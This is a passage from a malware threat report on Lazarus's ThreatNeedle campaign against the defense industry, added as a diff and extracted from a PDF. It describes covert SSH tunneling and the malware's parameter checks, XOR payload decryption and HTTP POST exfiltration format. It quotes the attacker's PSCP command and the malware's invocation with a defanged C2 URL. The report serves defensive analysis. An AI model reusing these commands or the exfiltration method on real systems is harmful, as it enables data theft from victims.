@@ -1,0 +1,63 @@
+Exfiltration
+We observed that the malware operator attempted to create SSH tunnels to a
+remote server located in South Korea from several compromised server hosts.
+They used a custom tunneling tool to achieve this. The tool receives four
+parameters: client IP address, client port, server IP address and server port. The
+tool offers basic functionality, forwarding client traffic to the server. In order to
+create a covert channel, the malware encrypts forwarded traffic using trivial
+binary encryption.
+Encryption routine
+Using the covert channel, the adversary copied data from the remote server
+over to the host using the PuTTy PSCP tool:
+       - `%APPDATA%\PBL\unpack.tmp -pw` _`[password]`_ `root@` _`[IP`_
+
+```
+            address] :/tmp/cab0215 %APPDATA%\PBL\cab0215.tmp
+```
+After copying data from the server, the actor utilized the custom tool to
+exfiltrate stolen data to the remote server. This malware looks like a legitimate
+VNC client and runs like one if it’s executed without any command line
+parameters.
+LAZARUS TARGETS DEFENSE INDUSTRY
+WITH THREATNEEDLE
+15
+© 2021 AO KASPERSKY LAB
+Execution of malware without parameters
+However, if this application is executed with specific command line parameters,
+it runs an alternate, malicious function. According to our telemetry, the actor
+executed this application with six parameters:
+
+%APPDATA%\Comms\Comms.dat S0RMM-50QQE-F65DN-DCPYN-5QEQA
+```
+   hxxps://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb[.]asp
+   %APPDATA%\Comms\cab59.tmp FL0509 15000
+
+```
+Also, if the number of command line parameters is greater than six, the malware
+jumps into a malicious routine. The malware also checks the length of the second
+argument – if it’s less than 29 characters, it terminates the execution. When the
+parameter checking procedure has passed successfully, the malware starts to
+decrypt its next payload.
+The embedded payload gets decrypted via XOR, where each byte from the end
+of the payload gets applied to the preceding byte. Next, the XORed blob
+receives the second command line argument that’s provided (in this case S0RMM-
+50QQE-F65DN-DCPYN-5QEQA ). The malware can accept more command line
+arguments, and depending on its number it runs differently. For example, it can
+also receive proxy server addresses with the “ -p ” option .
+When the decrypted in-memory payload is executed, it compares the header of
+the configuration data passed with the string “ 0x8406 ” in order to confirm its
+validity. The payload opens a given file (in this example
+%APPDATA%\Comms\cab59.tmp ) and starts exfiltrating it to the remote server.
+LAZARUS TARGETS DEFENSE INDUSTRY
+WITH THREATNEEDLE
+16
+© 2021 AO KASPERSKY LAB
+When the malware uploads data to the C2 server, it uses HTTP POST requests
+with two parameters named ‘ fr ’ and ‘ fp ’:
+      - The ‘ `fr` ’ parameter contains the file name from the command line
+
+argument to upload.
+      - The ‘ `fp` ’ parameter contains the base64 encoded size, CRC32 value of
+
+content and file contents.
+Contents of fp parameter
